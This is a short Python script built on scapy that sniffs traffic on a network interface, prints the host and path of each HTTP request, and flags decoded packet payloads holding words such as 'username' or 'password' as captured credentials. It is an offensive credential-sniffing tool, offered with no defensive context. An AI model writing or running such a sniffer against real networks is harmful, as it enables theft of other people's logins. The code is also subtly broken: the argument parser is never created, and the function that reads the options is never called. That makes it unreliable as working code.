import scapy.all as scapy
from scapy.layers import http
from urllib.parse import unquote
import argparse

def get_arguments():
    parser.argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="interface for sniffing")
    option=parser.parse_args()
    if not option.interface:
        parser.error("please write correct interface")
    return option

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode(errors='ignore')
        load = unquote(load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print("[+] HTTP request >>"+url.decode())

    login_info=get_login_info(packet)
    if login_info:
        print(f"\n\n[+] Possible username/password >{login_info}\n\n")



option=get_arguments
sniff(option.interface)
